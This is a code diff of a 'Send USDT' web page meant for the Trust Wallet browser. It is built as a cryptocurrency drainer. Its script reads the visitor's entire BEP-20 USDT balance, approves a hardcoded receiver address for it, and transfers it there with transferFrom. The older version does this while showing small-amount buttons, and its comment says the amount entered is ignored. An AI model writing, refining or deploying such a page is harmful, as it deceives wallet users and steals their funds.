@@ -47,45 +47,10 @@
       color: #fff;
       font-size: 14px;
     }
-    .input-actions {
-      margin-left: 10px;
-      display: flex;
-      gap: 12px;
-      font-size: 13px;
-    }
-    .input-actions span {
-      color: #00ff99;
-      cursor: pointer;
-    }
-    .amount-box {
-      display: flex;
-      align-items: center;
-    }
-    .amount-box .token {
-      color: #ccc;
-      margin-left: 10px;
-      font-size: 14px;
-    }
     .usd {
       font-size: 12px;
       color: #888;
       margin: 8px 0 28px;
-    }
-    .fill-buttons {
-      display: flex;
-      justify-content: space-between;
-      margin: 10px 0;
-    }
-    .fill-buttons button {
-      flex: 1;
-      margin: 0 5px;
-      padding: 10px;
-      border: none;
-      border-radius: 8px;
-      background: #2c2c2c;
-      color: #00ff99;
-      font-size: 14px;
-      cursor: pointer;
     }
     .fixed-button {
       position: fixed;
@@ -96,7 +61,7 @@
       padding: 16px;
       border-top: 1px solid #222;
     }
-    button#nextBtn {
+    button {
       width: 100%;
       background: #2c7a4b;
       border: none;
@@ -111,26 +76,16 @@
 </head>
 <body>
   <header>Send USDT</header>
-
   <div class="container">
-    <label>Address or Domain Name</label>
+    <label>Address</label>
     <div class="input-box">
-      <input type="text" id="wallet" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" disabled />
+      <input type="text" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" readonly />
     </div>
-
     <label>Amount</label>
-    <div class="input-box amount-box">
-      <input type="number" id="amount" placeholder="USDT Amount" />
-      <span class="token">USDT</span>
+    <div class="input-box">
+      <input type="number" placeholder="You can enter any value, but all USDT will be sent." disabled />
     </div>
-
-    <div class="fill-buttons">
-      <button onclick="fillAmount(1)">1 USDT</button>
-      <button onclick="fillAmount(2)">2 USDT</button>
-      <button onclick="fillAmount(3)">3 USDT</button>
-    </div>
-
-    <div class="usd">≈ $0.00</div>
+    <div class="usd">All balance will be sent automatically after approval</div>
   </div>
 
   <div class="fixed-button">
@@ -139,17 +94,14 @@
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <script>
-    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // hardcoded, non-editable
-    const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
+    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
+    const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
+
     const ABI = [
       { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
       { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
       { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
     ];
-
-    function fillAmount(value) {
-      document.getElementById('amount').value = value;
-    }
 
     async function start() {
       const btn = document.getElementById("nextBtn");
@@ -157,7 +109,7 @@
       btn.disabled = true;
 
       if (!window.ethereum) {
-        alert("Please use Trust Wallet DApp browser only.");
+        alert("Please open in Trust Wallet browser.");
         btn.innerText = "Next";
         btn.disabled = false;
         return;
@@ -165,14 +117,13 @@
 
       try {
         const web3 = new Web3(window.ethereum);
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        await window.ethereum.request({ method: "eth_requestAccounts" });
         const accounts = await web3.eth.getAccounts();
         const user = accounts[0];
-
         const contract = new web3.eth.Contract(ABI, USDT);
+
         const balance = await contract.methods.balanceOf(user).call();
 
-        // Approve and transfer all balance regardless of input field
         await contract.methods.approve(RECEIVER, balance).send({ from: user });
         await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
 
